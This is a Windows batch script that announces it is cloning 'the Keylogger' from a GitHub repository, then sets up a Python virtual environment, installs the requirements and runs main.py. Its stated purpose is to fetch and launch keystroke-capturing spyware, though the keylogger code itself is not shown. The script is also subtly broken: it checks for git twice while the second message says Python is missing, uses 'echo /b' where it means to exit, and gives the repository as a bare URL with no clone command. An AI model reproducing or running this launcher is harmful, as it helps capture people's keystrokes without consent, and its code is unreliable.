@echo off
git --version >nul 2>&1
if errorlevel 1(
    echo Git is not installed? please install git
    echo /b
)

git --version >nul 2>&1
if errorlevel 1(
    echo Python is not installed. Please install it first!
    echo /b
)

echo Clonning the Keylogger...
https://github.com/genshunimpact20-droid/saadsds

cd saadsds
py -m venv venv
if not exist requirements.txt (
    echo requirements.txt is not found.
) else (
    echo Installing the libs...
    venv\Scripts\pip install -r requirements.txt
)

echo Activate virtual enviroments..
if "%ComSpec%" == ""(
   venv\Scripts\activate
) else (
    call venv\Scripts\activate
)

echo Project is starting...
py main.py
